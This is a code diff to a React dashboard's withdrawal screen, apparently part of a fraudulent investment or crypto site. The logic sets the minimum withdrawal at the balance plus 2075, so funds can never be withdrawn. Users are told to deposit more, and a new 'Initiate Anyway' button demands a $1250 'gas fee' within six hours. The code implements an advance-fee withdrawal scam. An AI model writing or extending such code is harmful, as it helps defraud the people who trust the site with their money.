@@ -452,14 +452,13 @@ export default function Dashboard() {
                 Minimum withdrawal: {formatCurrency(user.balance + 2075)}
               </p>
             </div>
-            {/* Confirm Button */}
+
             {/* Confirm Button */}
             <button
               onClick={() => {
                 const minimumRequired = user.balance + 2075;
 
                 if (withdrawAmount < minimumRequired) {
-                  // Case 1: entered less than minimum
                   const shortfall = minimumRequired - user.balance;
                   alert(
                     `You need to deposit ${formatCurrency(
@@ -472,7 +471,6 @@ export default function Dashboard() {
                   withdrawAmount >= minimumRequired &&
                   withdrawAmount > user.balance
                 ) {
-                  // Case 2: entered above minimum but balance is insufficient
                   alert(
                     `You don’t have up to ${formatCurrency(
                       withdrawAmount
@@ -481,7 +479,6 @@ export default function Dashboard() {
                     )}.`
                   );
                 } else {
-                  // Meets or exceeds minimum and balance is sufficient
                   alert(
                     `Withdrawal request confirmed!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                       withdrawAmount
@@ -499,6 +496,25 @@ export default function Dashboard() {
             >
               Confirm Withdrawal
             </button>
+
+            {/* ✅ Initiate Anyway Button */}
+            {user.balance > 0 && (
+              <button
+                onClick={() => {
+                  alert(
+                    `Withdrawal initiated anyway!\n\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
+                      user.balance
+                    )}\n\nInstruction: Please deposit $1250 as a gas fee into your account within the next 6 hours to complete the withdrawal.`
+                  );
+                  setShowWithdraw(false);
+                  setWithdrawAmount("");
+                  setWithdrawMethod("");
+                }}
+                className="mt-4 px-6 py-2 bg-yellow-600 text-white rounded hover:bg-yellow-700 transition"
+              >
+                Initiate Anyway
+              </button>
+            )}
           </div>
         </div>
       )}
